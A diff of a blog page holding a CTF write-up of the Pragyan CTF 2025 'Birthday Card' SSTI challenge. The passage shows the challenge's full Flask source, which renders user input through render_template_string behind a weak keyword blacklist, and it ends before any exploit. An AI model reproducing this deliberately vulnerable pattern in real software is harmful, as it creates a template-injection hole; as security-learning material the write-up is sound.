@@ -1,230 +1,517 @@
-<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>Birthday Card - Pragyan CTF 2025 | Crong's Blog</title><meta property="og:title" content="Birthday Card - Pragyan CTF 2025 | Crong's Blog"><meta name=twitter:title content="Birthday Card - Pragyan CTF 2025 | Crong's Blog"><meta itemprop=name content="Birthday Card - Pragyan CTF 2025 | Crong's Blog"><meta name=application-name content="Birthday Card - Pragyan CTF 2025 | Crong's Blog"><meta property="og:site_name" content><meta name=description content="Datsuraku's blog"><meta itemprop=description content="Datsuraku's blog"><meta property="og:description" content="Datsuraku's blog"><meta name=twitter:description content="Datsuraku's blog"><meta property="og:locale" content="en-us"><meta name=language content="en-us"><link rel=alternate hreflang=en href=https://blog.datsuraku147.org/timeline/birthday-card/ title><meta name=generator content="Hugo 0.153.2"><meta property="og:url" content="https://blog.datsuraku147.org/timeline/birthday-card/"><meta property="og:site_name" content="Crong's Blog"><meta property="og:title" content="Birthday Card - Pragyan CTF 2025"><meta property="og:description" content="Introduction My knowledge about SSTI is little to none, so even though this was an easy challenge I still learned a lot! Kudos to the Pragyan Team for organizing the event.
+<!DOCTYPE html>
+<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">Birthday Card - Pragyan CTF 2025 | Crong&#39;s Blog</title>
+<meta property="og:title" content="Birthday Card - Pragyan CTF 2025 | Crong&#39;s Blog" />
+<meta name="twitter:title" content="Birthday Card - Pragyan CTF 2025 | Crong&#39;s Blog" />
+<meta itemprop="name" content="Birthday Card - Pragyan CTF 2025 | Crong&#39;s Blog" />
+<meta name="application-name" content="Birthday Card - Pragyan CTF 2025 | Crong&#39;s Blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="Datsuraku&#39;s blog">
+<meta itemprop="description" content="Datsuraku&#39;s blog" />
+<meta property="og:description" content="Datsuraku&#39;s blog" />
+<meta name="twitter:description" content="Datsuraku&#39;s blog" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+  <link rel="alternate" hreflang="en" href="http://localhost:1313/timeline/birthday-card/" title="" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.153.2">
+
+    
+    <meta property="og:url" content="http://localhost:1313/timeline/birthday-card/">
+  <meta property="og:site_name" content="Crong&#39;s Blog">
+  <meta property="og:title" content="Birthday Card - Pragyan CTF 2025">
+  <meta property="og:description" content="Introduction My knowledge about SSTI is little to none, so even though this was an easy challenge I still learned a lot! Kudos to the Pragyan Team for organizing the event.
 First glance When I went to the target site, https://birthday.ctf.prgy.in/, I saw this:
-My first thought is that the problem might be a sanitization issue since the only thing I can do is enter text to generate a card. Thankfully the challenge comes with the source appy.py"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="timeline"><meta property="article:published_time" content="2025-02-11T00:00:00+00:00"><meta property="article:modified_time" content="2025-02-11T00:00:00+00:00"><meta property="article:tag" content="Web"><meta property="article:tag" content="Ssti"><meta property="article:tag" content="Codereview"><meta name=twitter:card content="summary"><meta name=twitter:title content="Birthday Card - Pragyan CTF 2025"><meta name=twitter:description content="Introduction My knowledge about SSTI is little to none, so even though this was an easy challenge I still learned a lot! Kudos to the Pragyan Team for organizing the event.
+My first thought is that the problem might be a sanitization issue since the only thing I can do is enter text to generate a card. Thankfully the challenge comes with the source appy.py">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="timeline">
+    <meta property="article:published_time" content="2025-02-11T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-11T00:00:00+00:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Ssti">
+    <meta property="article:tag" content="Codereview">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Birthday Card - Pragyan CTF 2025">
+  <meta name="twitter:description" content="Introduction My knowledge about SSTI is little to none, so even though this was an easy challenge I still learned a lot! Kudos to the Pragyan Team for organizing the event.
 First glance When I went to the target site, https://birthday.ctf.prgy.in/, I saw this:
-My first thought is that the problem might be a sanitization issue since the only thing I can do is enter text to generate a card. Thankfully the challenge comes with the source appy.py"><link rel=canonical href=https://blog.datsuraku147.org/timeline/birthday-card/><link href=/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://blog.datsuraku147.org/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"><meta name=color-scheme content="light dark"><link rel=icon type=image/svg+xml href=/icons/favicon.svg></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://blog.datsuraku147.org/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
-</a><input type=checkbox id=menu-trigger class=menu-trigger>
-<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/categories/>Categories</a></li><li><a class=menu-link href=/tags/>Tags</a></li><li><a class="menu-link active" href=/timeline/>Timeline</a></li><li><a class=menu-link href=/crong/>Me???</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg>
-<svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>Birthday Card - Pragyan CTF 2025</h1><div class=post-meta><time datetime=2025-02-11T00:00:00+00:00 itemprop=datePublished>Feb 11, 2025</time></div></header><details class=toc zgotmplz><summary><b>Table of Contents</b></summary><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#first-glance>First glance</a></li><li><a href=#apppy>App.py</a><ul><li><a href=#used-of-jinja>Used of Jinja</a></li><li><a href=#sanitization>Sanitization</a></li><li><a href=#adminreport-endpoint>/admin/report endpoint</a></li></ul></li><li><a href=#genpy>gen.py</a></li><li><a href=#flag>Flag</a></li></ul></nav></details><div class=page-content><h2 id=introduction>Introduction</h2><p>My knowledge about SSTI is little to none, so even though this was an easy challenge I still learned a lot! Kudos to the Pragyan Team for organizing the event.</p><h2 id=first-glance>First glance</h2><p>When I went to the target site, <code>https://birthday.ctf.prgy.in/</code>, I saw this:</p><p><img src=/images/BirthdayCard-0.png alt="Image Description"></p><p>My first thought is that the problem might be a sanitization issue since the only thing I can do is enter text to generate a card. Thankfully the challenge comes with the source <code>appy.py</code></p><h2 id=apppy>App.py</h2><hr><details><summary>FullApp.py</summary><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, request, jsonify, abort, render_template_string, session, redirect
-</span></span><span style=display:flex><span><span style=color:#f92672>import</span> builtins <span style=color:#66d9ef>as</span> _b
-</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
-</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
-</span></span><span style=display:flex><span>app<span style=color:#f92672>.</span>secret_key <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>getenv(<span style=color:#e6db74>&#34;APP_SECRET_KEY&#34;</span>, <span style=color:#e6db74>&#34;default_app_secret&#34;</span>)
-</span></span><span style=display:flex><span>env <span style=color:#f92672>=</span> app<span style=color:#f92672>.</span>jinja_env
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>KEY <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>getenv(<span style=color:#e6db74>&#34;APP_SECRET_KEY&#34;</span>, <span style=color:#e6db74>&#34;default_secret_key&#34;</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>validator</span>:
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>security</span>():
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> _b
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>security1</span>(a, b, c, d):
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;validator&#39;</span> <span style=color:#f92672>in</span> a <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;validator&#39;</span> <span style=color:#f92672>in</span> b <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;validator&#39;</span> <span style=color:#f92672>in</span> c <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;validator&#39;</span> <span style=color:#f92672>in</span> d:
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> <span style=color:#e6db74>&#39;os&#39;</span> <span style=color:#f92672>in</span> a <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;os&#39;</span> <span style=color:#f92672>in</span> b <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;os&#39;</span> <span style=color:#f92672>in</span> c <span style=color:#f92672>or</span> <span style=color:#e6db74>&#39;os&#39;</span> <span style=color:#f92672>in</span> d:
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
-</span></span><span style=display:flex><span>    
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>security2</span>(a, b, c, d):
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> len(a) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>50</span> <span style=color:#f92672>and</span> len(b) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>50</span> <span style=color:#f92672>and</span> len(c) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>50</span> <span style=color:#f92672>and</span> len(d) <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>50</span>:
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span> :
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
-</span></span><span style=display:flex><span>        
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;GET&#34;</span>, <span style=color:#e6db74>&#34;POST&#34;</span>])
-</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>personalized_card</span>():
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;GET&#34;</span>:
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;&#34;&#34;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;link rel=&#34;stylesheet&#34; href=&#34;static/style.css&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;link href=&#34;https://fonts.googleapis.com/css?family=Poppins:300,400,600&amp;display=swap&#34; rel=&#34;stylesheet&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;div class=&#34;container&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;div class=&#34;card-generator&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;h1&gt;Personalized Card Generator&lt;/h1&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;form action=&#34;/&#34; method=&#34;POST&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;label for=&#34;sender&#34;&gt;Sender&#39;s Name:&lt;/label&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;input type=&#34;text&#34; id=&#34;sender&#34; name=&#34;sender&#34; placeholder=&#34;Your name&#34; required maxlength=&#34;50&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;label for=&#34;recipient&#34;&gt;Recipient&#39;s Name:&lt;/label&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;input type=&#34;text&#34; id=&#34;recipient&#34; name=&#34;recipient&#34; placeholder=&#34;Recipient&#39;s name&#34; required maxlength=&#34;50&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;label for=&#34;message&#34;&gt;Message:&lt;/label&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;input type=&#34;text&#34; id=&#34;message&#34; name=&#34;message&#34; placeholder=&#34;Your message&#34; required maxlength=&#34;50&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;label for=&#34;message_final&#34;&gt;Final Message:&lt;/label&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;input type=&#34;text&#34; id=&#34;message_final&#34; name=&#34;message_final&#34; placeholder=&#34;Final words&#34; required maxlength=&#34;50&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;button type=&#34;submit&#34;&gt;Generate Card&lt;/button&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;/form&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;/div&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;/div&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &#34;&#34;&#34;</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;POST&#34;</span>:
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
-</span></span><span style=display:flex><span>            recipient <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;recipient&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)
-</span></span><span style=display:flex><span>            sender <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;sender&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)
-</span></span><span style=display:flex><span>            message <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;message&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)
-</span></span><span style=display:flex><span>            final_message <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;message_final&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> validator<span style=color:#f92672>.</span>security1(recipient, sender, message, final_message) <span style=color:#f92672>and</span> validator<span style=color:#f92672>.</span>security2(recipient, sender, message, final_message):
-</span></span><span style=display:flex><span>                template <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;&#34;&#34;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;link rel=&#34;stylesheet&#34; href=&#34;static/style.css&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;link href=&#34;https://fonts.googleapis.com/css?family=Poppins:300,400,600&amp;display=swap&#34; rel=&#34;stylesheet&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;div class=&#34;container&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                        &lt;div class=&#34;card-preview&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                            &lt;h1&gt;Your Personalized Card&lt;/h1&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                            &lt;div class=&#34;card&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                                &lt;h2&gt;From: </span><span style=color:#e6db74>{</span>sender<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/h2&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                                &lt;h2&gt;To: </span><span style=color:#e6db74>{</span>recipient<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/h2&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                                &lt;p&gt;</span><span style=color:#e6db74>{</span>message<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/p&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                                &lt;h1&gt;</span><span style=color:#e6db74>{</span>final_message<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/h1&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                            &lt;/div&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                            &lt;a class=&#34;new-card-link&#34; href=&#34;/&#34;&gt;Create Another Card&lt;/a&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                        &lt;/div&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                    &lt;/div&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &#34;&#34;&#34;</span>
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span> :
-</span></span><span style=display:flex><span>                template<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;either the recipient or sender or message input is more than 50 letters&#34;</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>            app<span style=color:#f92672>.</span>jinja_env <span style=color:#f92672>=</span> env    
-</span></span><span style=display:flex><span>            app<span style=color:#f92672>.</span>jinja_env<span style=color:#f92672>.</span>globals<span style=color:#f92672>.</span>update({
-</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;validator&#39;</span>: validator()
-</span></span><span style=display:flex><span>            })
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> render_template_string(template)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;&#34;&#34;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;link rel=&#34;stylesheet&#34; href=&#34;static/style.css&#34;&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;div&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;h1&gt;Error: </span><span style=color:#e6db74>{</span>str(e)<span style=color:#e6db74>}</span><span style=color:#e6db74>&lt;/h1&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;br&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>                &lt;p&gt;Please try again. &lt;a href=&#34;/&#34;&gt;Back to Card Generator&lt;/a&gt;&lt;/p&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;/div&gt;
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &#34;&#34;&#34;</span>, <span style=color:#ae81ff>400</span>
-</span></span><span style=display:flex><span>        
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/debug/test&#34;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;POST&#34;</span>])
-</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>test_debug</span>():
-</span></span><span style=display:flex><span>    user <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;user&#34;</span>)
-</span></span><span style=display:flex><span>    host <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;Host&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> host <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;localhost:3030&#34;</span>:
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Access restricted to localhost:3030, this endpoint is only development purposes&#34;</span>, <span style=color:#ae81ff>403</span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> user:
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;You must be logged in to test debugging.&#34;</span>, <span style=color:#ae81ff>403</span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>ValueError</span>(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Debugging error: SECRET_KEY=</span><span style=color:#e6db74>{</span>KEY<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Debugging error occurred.&#34;</span>, <span style=color:#ae81ff>500</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#34;/admin/report&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>admin_report</span>():
-</span></span><span style=display:flex><span>    auth_cookie <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;session&#34;</span>)
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> auth_cookie:
-</span></span><span style=display:flex><span>        abort(<span style=color:#ae81ff>403</span>, <span style=color:#e6db74>&#34;Unauthorized access.&#34;</span>)
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
-</span></span><span style=display:flex><span>        token, signature <span style=color:#f92672>=</span> auth_cookie<span style=color:#f92672>.</span>rsplit(<span style=color:#e6db74>&#34;.&#34;</span>, <span style=color:#ae81ff>1</span>)
-</span></span><span style=display:flex><span>        <span style=color:#f92672>from</span> app.sign <span style=color:#f92672>import</span> initFn
-</span></span><span style=display:flex><span>        signer <span style=color:#f92672>=</span> initFn(KEY)
-</span></span><span style=display:flex><span>        sign_token_function <span style=color:#f92672>=</span> signer<span style=color:#f92672>.</span>get_signer()
-</span></span><span style=display:flex><span>        valid_signature <span style=color:#f92672>=</span> sign_token_function(token)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> valid_signature <span style=color:#f92672>!=</span> signature:
-</span></span><span style=display:flex><span>            abort(<span style=color:#ae81ff>403</span>, <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Invalid token.&#34;</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> token <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;admin&#34;</span>:
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Flag: p_ctf</span><span style=color:#e6db74>{redacted}</span><span style=color:#e6db74>&#34;</span>
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Access denied: admin only.&#34;</span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
-</span></span><span style=display:flex><span>        abort(<span style=color:#ae81ff>403</span>, <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Invalid token format: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.after_request</span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>clear_imports</span>(response):
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;app.sign&#39;</span> <span style=color:#f92672>in</span> sys<span style=color:#f92672>.</span>modules:
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>del</span> sys<span style=color:#f92672>.</span>modules[<span style=color:#e6db74>&#39;app.sign&#39;</span>]
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;app.sign&#39;</span> <span style=color:#f92672>in</span> globals():
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>del</span> globals()[<span style=color:#e6db74>&#39;app.sign&#39;</span>]
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> response
